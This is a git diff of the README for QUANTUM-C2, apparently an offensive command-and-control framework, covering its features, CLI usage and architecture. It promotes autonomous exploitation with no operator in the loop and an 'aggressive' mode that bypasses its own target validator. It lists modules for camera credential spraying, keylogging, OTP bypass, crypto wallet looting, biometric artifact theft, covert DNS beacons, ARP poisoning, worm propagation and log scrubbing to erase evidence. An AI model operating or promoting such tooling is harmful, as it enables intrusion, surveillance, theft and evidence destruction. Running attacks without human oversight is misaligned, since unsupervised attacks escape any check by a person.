@@ -1,203 +1,384 @@
-# QUANTUM-CLI V4.5.0 — Screenshots & Assets
+# QUANTUM-C2
 
-| Asset | Path / Status | Note |
-|---|---|---|
-| **Android APK (full)** | `android/app/build/outputs/apk/` — stale 9/29; rebuild parked (Gradle jar failure) | Full-release build; fresh build needed after Gradle env fix |
-| **Android APK (limited)** | `android/app/build/outputs/apk/` — stale 9/29 | Limited-release build |
-| **Windows EXE + launcher** | `dist/` / launcher + `quantum-cli-v4.5.0.exe` | PyInstaller verified |
-| **Web dashboard** | `/dash` (DASH_HTML) — IoT / OpenFable / SpyTV / Log / Catalog / Advanced Payloads | Live; camera-first, hidden-scrollbar sidebar, drag-drop + lock, gear settings, CVE feed |
-| **OpenFable chat widget** | `/api/openfable/*` + `#openfable` module | Real serve/chat/image with model picker verified |
-| **Log dashboard widget** | `postexploit/log_dashboard.py` + `/api/logs/*` | Real file ops; `.lootkey` immutable |
-| **Release bundles** | `release-4.5.0.zip` + `release-4.5.0.tar.gz` — GH `v4.5.0` | Verified at release URL |
-| **Crypto wallet post-exploit** | `postexploit/cryptowallet.py` + `/api/crypto/*` | Real file search / loot / crack options |
-| **Biometric clone / SMS style** | `postexploit/biometric_clone.py` + `/api/biometric/*` | Real face/fingerprint/voice artifact search + sqlite SMS style analysis |
-| **OTP bypass / SMS forward** | `postexploit/otp_bypass.py` + `/api/otp/*` | Real intercept config / keypad forward / reset |
-| **Log cleaner / evidence scrub** | `postexploit/log_cleaner.py` + `/api/logclean/*` | Real line removal by evidence keywords on target logs |
-| **God Mode / Auto-Config** | `postexploit/god_mode.py` + `auto_config.py` + `/api/god_mode/config` | Real full-access settings; functional naming; 403 documented honestly |
-| **Vault / Crypto Share** | `postexploit/vault_share.py` + `/api/vault/*` | VeraCrypt / TrueCrypt / Cryptomator / onion share bookmarks |
-| **NSO Pegasus / iOS Forced Entry** | `postexploit/nso_pegasus_ios.py` + `/api/nso_pegasus/*` | Real NSO Pegasus/Trident/forced-entry references (authorized only) |
-| **Dark Web Browser / Crawler** | `postexploit/dark_web_browser.py` + `/api/darkweb/*` | Real bookmark/crawler widget (search engines + onion refs + dump refs); no simulated browsing |
-| **AI Zero-Click + C2 Weapons** | `exploit_payloads/zero-click_exploits/` + `src/quantum/weapons/` sync'd from external frameworks | Real exploit modules + registry copied; no clobber of existing payloads |
-| **ADB Exploitation (functional)** | `postexploit/adb_exploit.py` + `/api/adb/*` | USB debug / APK deploy / shell / screen / logcat / file transfer; no tool-name branding on dashboard; all real ADB commands |
+**One launcher. One engagement. Recon to sealed loot to MITRE report — with no operator in the loop.**
 
-## Post-Exploitation Modules (real implementations, authorized only)
+QUANTUM-C2 is an autonomous offensive security framework for authorized penetration tests, lab ranges, and contracted engagements. Point it at a scope and the Overlord runs the loop itself: camera-first sweep, fingerprinting, validator-gated exploitation, post-exploitation staging, harvest, AES-256-GCM sealing, MITRE mapping. `Ctrl-C` seals the loot and exits clean.
 
-## Highlights (NSA-TAO-parity techniques)
-`dist/quantum-cli-v3.1-single.py`). One launcher, one importable package (`src/quantum/`), one goal:
-run a complete authorized engagement — recon to sealed loot to MITRE report — with camera-first
-autonomy and a production-grade C2.
+It is not a wrapper around someone else's tooling. The C2, the implant transports, the exploit catalog, the loot sealing, and the reporting layer all live in this repo and all run locally.
 
-> **Authorized engagements only.** QUANTUM-CLI is built for penetration tests, security labs, and
-> engagements with written authorization. Point it only at networks you are contracted to test.
+[![Release](https://img.shields.io/github/v/release/ProjectZeroDays/Quantum-C2?style=flat-square&color=268bee&label=release)](https://github.com/ProjectZeroDays/Quantum-C2/releases)
+[![License](https://img.shields.io/badge/license-MIT-3fb950?style=flat-square)](#license)
+[![Python](https://img.shields.io/badge/python-3.9%2B-3776ab?style=flat-square&logo=python&logoColor=white)](#requirements)
+[![CVE catalog](https://img.shields.io/badge/catalog-3%2C372%20CVEs-8957e5?style=flat-square)](exploit_catalog)
+[![Post-ex modules](https://img.shields.io/badge/post--ex-175%20modules-d29922?style=flat-square)](src/quantum/rat/modules)
+[![Commits](https://img.shields.io/github/last-commit/ProjectZeroDays/Quantum-C2?style=flat-square)](https://github.com/ProjectZeroDays/Quantum-C2/commits/main)
+[![Stars](https://img.shields.io/github/stars/ProjectZeroDays/Quantum-C2?style=flat-square)](https://github.com/ProjectZeroDays/Quantum-C2/stargazers)
 
-## Highlights (NSA-TAO-parity techniques)
+[![CI](https://img.shields.io/github/actions/workflow/status/ProjectZeroDays/Quantum-C2/ci.yml?style=flat-square&label=ci)](https://github.com/ProjectZeroDays/Quantum-C2/actions/workflows/ci.yml)
+[![Payloads](https://img.shields.io/github/actions/workflow/status/ProjectZeroDays/Quantum-C2/payloads.yml?style=flat-square&label=payloads)](https://github.com/ProjectZeroDays/Quantum-C2/actions/workflows/payloads.yml)
+[![Kernel exploits](https://img.shields.io/github/actions/workflow/status/ProjectZeroDays/Quantum-C2/kernel-exploits.yml?style=flat-square&label=kernel%20exploits)](https://github.com/ProjectZeroDays/Quantum-C2/actions/workflows/kernel-exploits.yml)
+[![Android](https://img.shields.io/github/actions/workflow/status/ProjectZeroDays/Quantum-C2/android-apk.yml?style=flat-square&label=android%20apk)](https://github.com/ProjectZeroDays/Quantum-C2/actions/workflows/android-apk.yml)
 
-| Capability | What it does |
-|---|---|
-| **29-CVE weapon registry** | Tiered `ZERO_DAY_REGISTRY` (legacy / V3_HIGH / V3_MED / V3_CHECK) with a fire contract (`registry.fire(cve, ip)`) and AI- or QBrain-planned auto-exploit. |
-| **Camera warfare (CAMWAR)** | TCP + WS-Discovery camera discovery, vendor fingerprinting (Hikvision, Dahua, Axis, Foscam, TP-Link, generic), credential spray, snapshot + PTZ control. |
-| **Autonomous Overlord** | Full engagement loop with no operator input: camera-first sweep, recon, validator-gated exploitation, post-exploit staging, harvest, sealing, MITRE mapping. |
-| **Production WSGI C2 + kill-switch** | Waitress-served Flask C2 on `:8443` (gunicorn fallback, Flask dev last resort) with a covert kill-switch (`POST /kill`) that wipes and retires every beaconing implant. |
-| **DoH egress agents (GHOSTFANG-DNS)** | POSIX agents whose beacons ride public DoH resolvers (443/tcp) as base32 subdomain labels — no inbound ports, tasking via DNS TXT records. |
-| **PolyMorph v3** | Per-beacon epoch-keyed HMAC keystreams, UTF-7 variants, and junk filler — identical plaintexts never produce identical wire bytes. |
-| **GRAYFISH sealed loot** | All loot sealed at rest with AES-256-GCM (`.gfy` files); the sealing key at `logs/.lootkey` is created once and is immutable. |
-| **EMOJISMS covert channel** | Emoji-encoding covert channel (`emoji` command) for steganographic message passing. |
+[![Windows](https://img.shields.io/badge/windows-exe-3fb950?style=flat-square&logo=windows&logoColor=white)](#platforms)
+[![Linux](https://img.shields.io/badge/linux-supported-3fb950?style=flat-square&logo=linux&logoColor=white)](#platforms)
+[![Android](https://img.shields.io/badge/android-apk-3fb950?style=flat-square&logo=android&logoColor=white)](#platforms)
+[![macOS](https://img.shields.io/badge/macOS-build%20script-d29922?style=flat-square&logo=apple&logoColor=white)](#platforms)
+[![iOS](https://img.shields.io/badge/iOS-target%20only-8b949e?style=flat-square&logo=apple&logoColor=white)](#platforms)
+[![Packaging](https://img.shields.io/badge/deb%20%2F%20snap-not%20produced-8b949e?style=flat-square)](#platforms)
+
+> **Authorized engagements only.** QUANTUM-C2 assumes written authorization for every network you point it at.
+
+---
+
+## Contents
+
+- [What this is](#what-this-is)
+- [What this is not](#what-this-is-not)
+- [Platforms](#platforms)
+- [Requirements](#requirements)
+- [Install](#install)
+- [Quick start](#quick-start)
+- [Configuration](#configuration)
+- [Usage](#usage)
+- [Architecture](#architecture)
+- [Repo layout](#repo-layout)
+- [Testing](#testing)
+- [Known gaps](#known-gaps)
+- [Troubleshooting](#troubleshooting)
+- [FAQ](#faq)
+- [Documentation](#documentation)
+- [Release notes](#release-notes)
+- [Contributing](#contributing)
+- [Security policy](#security-policy)
+- [Credits](#credits)
+- [License](#license)
+
+---
+
+## What this is
+
+An autonomous engagement loop with a real C2 underneath it, built to run unattended and leave an auditable trail.
+
+| | |
+| --- | --- |
+| **Autonomous Overlord** | Unattended engagement loop with aggression postures, validator gating, and cycle caps. Runs AI-planned or fully deterministic (`--no-ai`). |
+| **Production C2** | Waitress-served WSGI C2 on `:8443` with a covert kill-switch that wipes and retires every beaconing implant. |
+| **DoH egress implants** | GHOSTFANG-DNS beacons ride public DoH resolvers on 443/tcp as base32 subdomain labels. No inbound ports; tasking over DNS TXT. |
+| **3,372-CVE catalog** | Indexed by CVE and by vendor across 95 vendors, with a tiered registry, a fire contract, and a daily auto-update workflow. |
+| **175 post-ex modules** | 14 lanes: credentials, crypto, forensics, privesc, persistence, evasion, network, radio, exfil, control, accounts, OTP, MITM, abuse. |
+| **Camera warfare** | TCP and WS-Discovery discovery, vendor fingerprinting, credential spray, snapshot and PTZ control. |
+| **PolyMorph v3** | Per-beacon epoch-keyed HMAC keystreams with junk filler — identical plaintexts never produce identical wire bytes. |
+| **Sealed loot** | Everything sealed at rest with AES-256-GCM. The sealing key is created once and never rewritten. |
+| **Listener manager** | Unique port allocation per engagement; every listener serves and receives callbacks independently. |
+| **MITRE reporting** | Audit log maps to `logs/mitre_map.json` on demand. |
+| **Android operator app** | On-device dashboard, tasking, and telemetry against the same API. |
+
+### The engagement loop
+
+```
+recon → fingerprint → validator gate → exploit → stage → harvest → seal → MITRE map
+```
+
+`--aggression` controls how the loop behaves at the gate. `balanced` respects the validator; `aggressive` fires past it; `patient` waits for a stronger signal. `--cycles N` caps iterations, `0` runs until interrupted.
+
+---
+
+## What this is not
+
+Read this before you file an issue.
+
+**A Metasploit replacement, this is not.** The catalog indexes 3,372 CVEs across 95 vendors. It does not fire 3,372 exploits — catalogued means known and linked, and the set that actually runs is far smaller. Check the CVE's folder in `exploit_catalog/` for what it really is before assuming `auto` lands it.
+
+**Not Cobalt Strike either.** There's a C2, workable transports, and a kill-switch, but no team server and no Malleable C2 profile language. Federation (`--peer <onion>`) syncs a peer's implant registry — that's shared state, not a shared live session. One operator, one box, one engagement.
+
+**Not commercial spyware.** Pegasus-adjacent chains are here as forged stages, not as NSO's implant, and nothing is turnkey against an arbitrary handset. Delivery and per-device offsets are yours to solve.
+
+**Not quiet.** Recon is a sweep. A default autonomous `/24` run is loud and `--aggression aggressive` is louder. If the engagement has an IDS budget, plan around it.
+
+**Not Windows-first.** A meaningful share of modules are POSIX-only or were developed against Linux targets. Windows is covered and gets a CI leg, but the bias runs toward Linux, routers, and cameras.
+
+**Not an AV-evasion product.** PolyMorph changes wire bytes, not on-disk signatures. No EDR bypass is guaranteed.
+
+**Not affiliated with the real thing.** QUANTUM, FOXACID, and CAMWAR are homage to the published TAO tooling. Independent reimplementation, no shared code.
+
+### What "verified" means here
+
+Payload folders are **generators that self-verify structurally** — they emit honest JSON and report `vulnerable: true` only when a target-side signal was observed. Generation is not RCE confirmation; that needs the vendor's vulnerable parser and a real delivery path.
+
+Radio zero-clicks (BlueFrag, BT HID, KRACK) produce correct frames; radio delivery is lab-side. Exactly one exploit is verified end-to-end against a live target: the ADB TLS bypass, against a mock adbd.
+
+Everything runs locally — no telemetry, no license server, no account. But AI planning is a network call by default; `--no-ai` makes the run fully offline and deterministic.
+
+Single maintainer, best-effort, no SLA. CI is currently red on `main`.
+
+---
+
+## Platforms
+
+| Target | Status |
+| --- | --- |
+| Windows | **Ships** — PyInstaller EXE, verified build |
+| Linux / Kali | **Ships** — primary development target |
+| Android | **Ships** — APK built in CI, operator app |
+| macOS | **Build script only** — `build/mac/build-dmg.sh`, no `.dmg` committed |
+| iOS | **Target only** — `.ipa` needs an Apple toolchain, not produced |
+| `.deb` / `.snap` | **Not produced** — scripts exist in `build/deb/`, `build/snap/` |
+
+macOS and iOS are marked honestly rather than claimed. If you need either, the scripts are the starting point, not a download.
+
+---
+
+## Requirements
+
+- Python **3.9+**
+- `pip` and a virtualenv you're willing to pollute
+- Optional: `nmap`, `adb`, `tor` for the commands that shell out to them
+- Optional: an AI provider key for AI-planned runs (see [Configuration](#configuration))
+
+Dependencies install from `requirements.txt`. The core set is Flask, Waitress, pycryptodome, impacket, pysmb, requests, and colorama.
+
+---
+
+## Install
+
+```bash
+git clone https://github.com/ProjectZeroDays/Quantum-C2
+cd Quantum-C2
+
+python -m venv .venv
+source .venv/bin/activate        # Windows: .venv\Scripts\activate
+
+pip install -r requirements.txt
+```
+
+For the test suite as well:
+
+```bash
+pip install -r requirements-dev.txt
+```
+
+Nothing needs root except the commands that do raw sockets or ARP work — run those with `sudo` individually rather than elevating the whole shell.
+
+---
 
 ## Quick start
 
 ```bash
-# 1. Install (Python 3.9+)
-pip install flask requests waitress pycryptodome impacket pysmb colorama
-
-# 2. Optional: AI planning via Abliterated.ai (else QBrain deterministic fallback)
-echo ABLITERATION_KEY=your-key-here > .env
-
-# 3. Run fully autonomous (camera-first) on the autodetected local /24
-python quantum_cli.py
+python quantum_cli.py                                  # autonomous, camera-first, local /24
+python quantum_cli.py --target 203.0.113.0/24          # external scope
+python quantum_cli.py --no-ai --cycles 5               # fully deterministic, no AI calls
+python quantum_cli.py serve                            # C2 only, no autonomy
 ```
 
-No arguments = fully autonomous, camera-first. The Overlord starts the C2 on `:8443`, sweeps the
-scope for cameras, then loops recon → validate → plan → fire → post-exploit → harvest → seal →
-MITRE map. `Ctrl-C` at any time seals loot and exits cleanly.
+No arguments means fully autonomous. The Overlord starts the C2 on `:8443`, sweeps scope for cameras, then loops. `Ctrl-C` at any point seals the loot and exits cleanly.
 
-## Usage — every CLI command
+`--target` with a bare IP is expanded to its `/24` and runs camera war autonomously. Add `--manual` for the step-through camera console.
 
-The single launcher `quantum_cli.py` (delegates to `python -m quantum`) takes an optional direct
-command. With no command and no `--menu`, it runs the Autonomous Overlord.
+---
+
+## Configuration
+
+Configuration is environment-driven. Copy the shape below into `.env` in the repo root; it is read at startup.
+
+```bash
+# AI planning (optional — omit entirely for QBrain deterministic mode)
+ABLITERATION_KEY=your-key-here
+
+# Pin a model instead of using adaptive selection
+QCLI_PINNED_MODEL=model-id
+
+# Force deterministic mode without passing --no-ai
+QCLI_NO_AI=1
+```
+
+| Variable | Effect |
+| --- | --- |
+| `ABLITERATION_KEY` | Enables AI planning via Abliterated.ai. Without it, QBrain decides. |
+| `QCLI_PINNED_MODEL` | Locks the AI model. Overridden by `--model`. |
+| `QCLI_NO_AI` | Same as `--no-ai` — no prompts, no model downloads, no provider calls. |
+
+Provider presets and key status are listed with `python quantum_cli.py providers`. Supported presets: abliteration, openrouter, venice, agnes, opencode.
+
+With no key and no AI, everything still works — QBrain is a deterministic planner, not a degraded mode.
+
+---
+
+## Usage
+
+`quantum_cli.py` is the single entry point and delegates to `python -m quantum`. With no command and no `--menu`, it runs the autonomous Overlord.
 
 ### Global flags
 
 | Flag | Meaning |
-|---|---|
-| `--menu` | Open the manual console (option-driven, includes camera console `c`). |
-| `--scope`, `-c <CIDR>` | Autonomous/scan scope. |
-| `--target`, `-t <IP/CIDR>` | External target — runs camera war on it **autonomously by default** (add `--manual` for the manual camera console). A bare IP is expanded to its `/24`. |
+| --- | --- |
+| `--menu` | Open the manual console, including the camera console (`c`). |
+| `--scope`, `-c <CIDR>` | Autonomous / scan scope. |
+| `--target`, `-t <IP/CIDR>` | External target — autonomous camera war by default; add `--manual` for the console. |
 | `--manual` | With `--target`: manual camera console instead of autonomous. |
 | `--camera-only` | Restrict autonomous mode to camera operations. |
-| `--no-ai` | Fully deterministic (QBrain) — no AI prompts, no model downloads, no network to AI providers. |
-| `--cycles <N>` | Autonomous cycle cap (0 = infinite). |
-| `--aggression balanced\|aggressive\|patient` | Autonomous posture (aggressive forces exploitation past the validator). |
-| `--model <id>` | Pin the AI model (overrides adaptive selection; also `QCLI_PINNED_MODEL`). |
+| `--no-ai` | Fully deterministic. No AI prompts, no downloads, no provider network calls. |
+| `--cycles <N>` | Autonomous cycle cap. `0` is infinite. |
+| `--aggression balanced\|aggressive\|patient` | Autonomous posture at the validator gate. |
+| `--model <id>` | Pin the AI model. |
 | `--kill` | Arm the kill-switch against a live C2 via `POST /kill`. |
-| `--domain <domain>` | Operator-controlled domain for DoH egress beacons (`ghostdns`). |
+| `--domain <domain>` | Operator-controlled domain for DoH egress beacons. |
 | `-g`, `--gateway` | Gateway IP for QUANTUM insert. |
 | `--iface` | Network interface. |
 | `--peer <onion>` | Federation peer `.onion` to sync. |
-| `-dc-ip`, `-dc-name`, `-d` | Domain-controller parameters (`zerologon`). |
-| `-f`, `--file` | Input file (`pcap`). |
-| `--force` | Force exploitation past the validator gate (`auto`, `keygen`). |
+| `-dc-ip`, `-dc-name`, `-d` | Domain-controller parameters for `zerologon`. |
+| `-f`, `--file` | Input file for `pcap`. |
+| `--force` | Force exploitation past the validator gate. |
 
-### Command examples
+### C2 and network
 
 ```bash
-# C2 / NETWORK
-python quantum_cli.py serve                     # production WSGI C2 on :8443 (waitress)
-python quantum_cli.py federation                # start federation hidden service -> {"onion": ...}
+python quantum_cli.py serve                            # production WSGI C2 on :8443
+python quantum_cli.py federation                       # start federation service -> {"onion": ...}
 python quantum_cli.py federation --peer <peer-onion>   # merge a peer's implant registry
-python quantum_cli.py posixagent               # generate the POSIX agent (ghostfang.sh); -t to pin host
-python quantum_cli.py ghostdns --domain ops.example.tld   # GHOSTFANG-DNS DoH egress agent + task check
+python quantum_cli.py posixagent                       # generate the POSIX agent; -t to pin host
+python quantum_cli.py ghostdns --domain ops.example.tld  # DoH egress agent + task check
+python quantum_cli.py listener deploy                  # allocate a listener on 9100-9999
+python quantum_cli.py listener active                  # list active listeners
+python quantum_cli.py listener hits                    # show callback hits
+python quantum_cli.py listener stopall                 # tear down every listener
+```
 
-# CAMERA WARFARE
-python quantum_cli.py camwar -c 10.0.0.0/24    # discover + attack + control every camera in scope
-python quantum_cli.py camshot -t 10.0.0.42      # one-shot single camera (auto identify/attack/snapshot)
+### Camera warfare
 
-# RECON / PROBE
+```bash
+python quantum_cli.py camwar -c 10.0.0.0/24    # discover, attack, control every camera in scope
+python quantum_cli.py camshot -t 10.0.0.42     # one-shot: identify, attack, snapshot
+python quantum_cli.py cams -c 10.0.0.0/24      # verbose step-through variant
+```
+
+### Recon and probing
+
+```bash
 python quantum_cli.py zerocheck -t 10.0.0.42   # 9-probe battery: log4shell, citrixbleed, citrix path,
-                                                 #   PAN-OS, Confluence OGNL, WebLogic, IOS XE, vCenter, MOVEit
-python quantum_cli.py recon -t 10.0.0.42        # fingerprint
-python quantum_cli.py osint -t example.com       # OSINT lookup
-python quantum_cli.py validator -t 10.0.0.42    # target-value scoring (exploit gate)
+                                               #   PAN-OS, Confluence OGNL, WebLogic, IOS XE, vCenter, MOVEit
+python quantum_cli.py recon -t 10.0.0.42       # fingerprint
+python quantum_cli.py osint -t example.com     # OSINT lookup
+python quantum_cli.py validator -t 10.0.0.42   # target-value scoring, the exploit gate
+```
 
-# EXPLOITATION
-python quantum_cli.py auto -t 10.0.0.42         # validator-gated auto-exploit (add --force to skip gate)
-python quantum_cli.py brute -t 10.0.0.42        # credential spray
-python quantum_cli.py phish -t user@example.com  # phish engine
+### Exploitation
 
-# POST-EXPLOIT / IMPLANT OPS
-python quantum_cli.py keylog                     # stage the keylogger (delivered on next beacon)
-python quantum_cli.py persist                    # stage persistence (PERSISTX)
-python quantum_cli.py wipe                       # footprint wipe (Windows or POSIX, per host OS)
-python quantum_cli.py seal                        # seal all loot (GRAYFISH)
-python quantum_cli.py unseal                     # unseal all loot
+```bash
+python quantum_cli.py auto -t 10.0.0.42        # validator-gated auto-exploit; --force skips the gate
+python quantum_cli.py brute -t 10.0.0.42       # credential spray
+python quantum_cli.py routerexploit -t 10.0.0.42  # router CVE set
+python quantum_cli.py phish -t user@example.com   # phish engine
+```
 
-# TECHNIQUES
-python quantum_cli.py mshtmaldoc                # build the MSHTML maldoc (CVE-2021-40444)
-python quantum_cli.py flashfill                  # FlashFill staged-fill technique
-python quantum_cli.py cagebreak                  # escape the (macOS) sandbox cage
-python quantum_cli.py macreset                   # generate the macOS recovery-reset script
-python quantum_cli.py emoji                       # EMOJISMS: encode a message into emoji, verify decode
+### Implant and post-exploit
 
-# AI / OPSEC / REPORTING
-python quantum_cli.py deployai                   # deploy the local AI model into models/
-python quantum_cli.py keygen                      # (re)generate implant crypto keys; --force overwrites
-python quantum_cli.py mitre                      # regenerate logs/mitre_map.json from the audit log
-python quantum_cli.py --menu                     # manual console (all of the above, menu-driven)
+```bash
+python quantum_cli.py keylog                   # stage the keylogger, delivered on next beacon
+python quantum_cli.py persist                  # stage persistence (PERSISTX)
+python quantum_cli.py wipe                     # footprint wipe, per host OS
+python quantum_cli.py seal                     # seal all loot (GRAYFISH)
+python quantum_cli.py unseal                   # unseal all loot
+python quantum_cli.py harvest                  # pull staged artifacts
+```
 
-# OPERATOR SUITE (v4.4)
-python quantum_cli.py providers                   # list AI provider presets + key status (abliteration/openrouter/venice/agnes/opencode)
-python quantum_cli.py agents                      # list/create/edit SLDR + NS-org agent presets
-python quantum_cli.py skills                     # list/seed skill packs (PROMPT/TOOL/SCRIPT) + compose prompts
-python quantum_cli.py workflows                  # list/create/run workflows (variable substitution, ${first_host} chaining)
-python quantum_cli.py p0feed                     # Google Project Zero feed: latest posts + zero-day candidates
+### Techniques
 
-# AUTONOMOUS MODES
-python quantum_cli.py                            # fully autonomous, camera-first, local /24
-python quantum_cli.py --no-ai --cycles 5         # deterministic (QBrain), 5 cycles, no AI calls
-python quantum_cli.py --target 203.0.113.0/24    # external network: autonomous camera war by default
-python quantum_cli.py --target 203.0.113.7 --manual   # same, but manual camera console
+```bash
+python quantum_cli.py mshtmaldoc               # build the MSHTML maldoc (CVE-2021-40444)
+python quantum_cli.py flashfill                # FlashFill staged-fill technique
+python quantum_cli.py cagebreak                # escape the macOS sandbox cage
+python quantum_cli.py macreset                 # generate the macOS recovery-reset script
+python quantum_cli.py emoji                    # EMOJISMS: encode a message, verify decode
+python quantum_cli.py cottonmouth -t 10.0.0.42 # payload staging
+python quantum_cli.py worm -t 10.0.0.42        # GODSUPREME worm hop
+python quantum_cli.py zerologon -dc-ip 10.0.0.1 -dc-name DC01 -d CORP.LOCAL
+```
+
+### AI, OPSEC, reporting
+
+```bash
+python quantum_cli.py deployai                 # deploy the local AI model into models/
+python quantum_cli.py keygen                   # regenerate implant crypto keys; --force overwrites
+python quantum_cli.py mitre                    # regenerate logs/mitre_map.json from the audit log
+python quantum_cli.py tor                      # ensure Tor is up
+python quantum_cli.py p0feed                   # Project Zero feed: latest posts and candidates
+```
+
+### Operator suite
+
+```bash
+python quantum_cli.py providers                # list provider presets + key status
+python quantum_cli.py agents                   # list/create/edit agent presets
+python quantum_cli.py skills                   # list/seed skill packs, compose prompts
+python quantum_cli.py workflows                # list/create/run workflows
+python quantum_cli.py --menu                   # manual console, everything above
 ```
 
 ### Remaining direct commands
 
 | Command | Purpose |
-|---|---|
+| --- | --- |
 | `foxacid` | FOXACID watering-hole server on `:8081`. |
-| `quantum -t <ip> -g <gw>` | QUANTUM insert (ARP poison + inject). |
+| `quantum -t <ip> -g <gw>` | QUANTUM insert — ARP poison and inject. |
 | `dohc2` | DoH C2 beacon server on `:5353`. |
-| `icmp` | Switchboard ICMP covert-channel listener (20 s). |
+| `icmp` | Switchboard ICMP covert-channel listener, 20 s. |
 | `trinity` | Trinity memory capture. |
-| `cams -c <cidr>` | Discover + attack + control cameras (verbose step-through). |
 | `wifi` | Somberknight wireless sweep. |
 | `triage` | Wildfire triage. |
 | `mfp` | MFP persistence. |
 | `pcap -f <file>` | PCAP analysis. |
-| `router -t <ip>` | UnitedDrake router attack. |
-| `worm -t <ip>` | GODSUPREME worm hop. |
-| `episcribe [-t <sel>]` | EpiScribe watch (300 s) with optional selector. |
-| `cottonmouth [-t <ip>]` | CottonMouth payload staging. |
-| `tor` | Ensure Tor is up (OPSEC). |
-| `zerologon -dc-ip <ip> -dc-name <name> -d <dom>` | Zerologon dump. |
+| `episcribe [-t <sel>]` | EpiScribe watch, 300 s. |
+
+---
+
+## Architecture
+
+Two planes, deliberately separate.
+
+**Control plane** — `src/quantum/c2/`. A Flask app served by Waitress on `:8443` (gunicorn fallback, Flask dev server as last resort). Holds the implant registry, task lifecycle, event bus, telemetry store, and the dashboard API. `POST /kill` wipes and retires every beaconing implant.
+
+**Operator plane** — `src/quantum/overlord/`. The decision loop. Consumes recon output, scores targets through the validator, selects from the weapon registry, and drives the post-exploitation lanes. `--no-ai` swaps the AI supervisor for QBrain, a deterministic policy.
+
+Everything crossing between them lands in `logs/audit.jsonl`, which is the sole input to `mitre_map.json`. Loot never leaves the target unsealed — GRAYFISH wraps each artifact in AES-256-GCM before it is written, and `logs/.lootkey` is created once and never rewritten.
+
+Implant transports are interchangeable: HTTPS beacon, GHOSTFANG-DNS over DoH, or the ICMP switchboard. PolyMorph v3 sits under all of them, rekeying per epoch so identical plaintexts differ on the wire.
+
+---
 
 ## Repo layout
 
 ```
 quantum-cli/
 ├── quantum_cli.py                # single-entry launcher (delegates to src/quantum)
-├── src/quantum/                  # the V4 package — split of the V3.1 single-file spec
-│   ├── core/                     # env/paths, audit log + MITRE mapper, opsec, GRAYFISH, QBrain, deps
-│   ├── ai/                       # AI_Supervisor (Abliterated.ai primary) + local model bootstrap
+├── src/quantum/                  # the package
+│   ├── core/                     # env/paths, audit log + MITRE mapper, opsec, GRAYFISH, QBrain
+│   ├── ai/                       # AI_Supervisor + local model bootstrap
 │   ├── recon/                    # scan, fingerprint/Validator, OSINT, DoH, WS-Discovery/ONVIF
-│   ├── camwar/                   # CAMWAR engine, vendor tables, RTSP, brute/phish v3
-│   ├── weapons/                  # 29+ CVE registry, kernel/remote/media/legacy/bluetooth/adb tiers,
-│   │   │                         #   PolyMorph, techniques (cagebreak, flashfill, macreset, emojisms)
-│   │   └── ...
+│   ├── camwar/                   # CAMWAR engine, vendor tables, RTSP, brute/phish
+│   ├── weapons/                  # tiered CVE registry, kernel/remote/media/legacy/bluetooth/adb,
+│   │                             #   PolyMorph, techniques
+│   ├── rat/modules/              # 175 post-ex modules across 14 lanes (lane_A … lane_N)
 │   ├── postexploit/              # persistx, kitlogger, killswitch, harvest, footprint
-│   ├── c2/                       # Flask app + routes, waitress WSGI, transports, agents (ghostfang, ghostdns)
+│   ├── c2/                       # Flask app + routes, Waitress WSGI, transports, agents
 │   ├── overlord/                 # AutonomousOverlord, decide policy, engagement engines
-│   └── dash/                     # live ops dashboard (served at /dash)
-├── agents/build/variant.py       # deterministic per-target OBSIDIAN agent variant builder
-├── agents/build/out/            # generated variant stagers (obsidian_<ip>_e<epoch>_<tag>.ps1)
-├── exploit_payloads/             # per-CVE deploy folders (deploy.py + README + WhitePaper each;
-│                                 #   includes the verified zero-click suite — see docs/ZERO_CLICK_AUDIT.md)
-├── tests/                        # pytest suite (registry, polymorph, emoji, variant, operator suite)
-├── dist/quantum-cli-v3.1-single.py   # archived single-file V3.1 spec (reference)
-├── single-script/                # legacy single-file reference copy + standalone zero-click frameworks
+│   ├── control/                  # SQLite registry, loot FTS5 index, device diff snapshots
+│   └── dash/                     # live ops dashboard, served at /dash
+├── exploit_catalog/              # 3,372 CVEs — by_cve/ and by_vendor/
+├── exploit_payloads/             # per-CVE deploy folders (deploy.py + README + WhitePaper each)
+├── android/                      # operator app source, APK build outputs
+├── agents/build/variant.py       # deterministic per-target OBSIDIAN variant builder
 ├── qcli/                         # runtime: keys/, obsidian.ps1, ghostfang.sh, ghostdns.sh
-├── logs/                         # audit.jsonl, decisions.jsonl, mitre_map.json, .lootkey (immutable!)
+├── logs/                         # audit.jsonl, decisions.jsonl, mitre_map.json, .lootkey
 ├── loot/                         # sealed loot (*.gfy)
 ├── models/                       # local AI models
-└── docs/                         # WIKI, OPERATOR_MANUAL, TROUBLESHOOTING, HOWTOs, ZERO_CLICK_AUDIT
+├── docs/                         # WIKI, OPERATOR_MANUAL, TROUBLESHOOTING, HOWTOs, audits
+├── release/                      # versioned release artifacts
+└── tests/                        # pytest suite
 ```
+
+`dist/` holds the archived single-file V3.1 build and the Windows binary. `single-script/` holds legacy single-file reference copies.
+
+---
 
 ## Testing
 
@@ -205,70 +386,146 @@ quantum-cli/
 pytest tests/
 ```
 
-The suite covers the weapon registry fire contract, PolyMorph v3 round-trips and epoch/junk
-diversification, the EMOJISMS codec, and variant-builder determinism (same target+epoch is
-byte-identical; different epochs differ bytewise).
+The suite covers the weapon registry fire contract, PolyMorph round-trips and epoch/junk diversification, the EMOJISMS codec, variant-builder determinism, the 14 zero-click generation battery, the 13 perimeter closed-port battery, and the folder-registry resolve contract.
 
-## Release artifacts
+Two census gates run in CI and fail the build: `scripts/placeholder_census.py` rejects `NotImplementedError`, bare `...` bodies, `pass`-only functions, and self-declared simulated literals; `scripts/endpoint_census.py` rejects any outbound host not in the endpoint manifest. Together they enforce the rule the project is built on — no shipped module may claim a capability it did not verify.
 
-- `dist/quantum-cli-v3.1-single.py` — the archived single-file V3.1 build (THE SPEC).
-- `agents/build/out/` — generated OBSIDIAN stager variants.
+CI runs on Linux and Windows across Python 3.9, 3.11, and 3.13. The Android leg is CI-only; local Gradle builds are parked.
+
+---
+
+## Known gaps
+
+Tracked openly rather than papered over.
+
+- **Android local builds are broken.** Gradle jar failure; APKs come from CI only.
+- **macOS, iOS, `.deb`, and `.snap` produce no artifact.** Scripts exist, nothing is committed.
+- **CI is red on `main`.** Last push failed. Treat `main` as moving.
+- **Per-device offsets are null by design** in several kernel and baseband payloads. Resolve with `resolve_offsets.py` against the actual device.
+- **Radio zero-click delivery is lab-side.** Frames are correct; you supply the radio.
+- **Catalog breadth outruns weaponization.** 3,372 catalogued, far fewer runnable.
+
+---
+
+## Troubleshooting
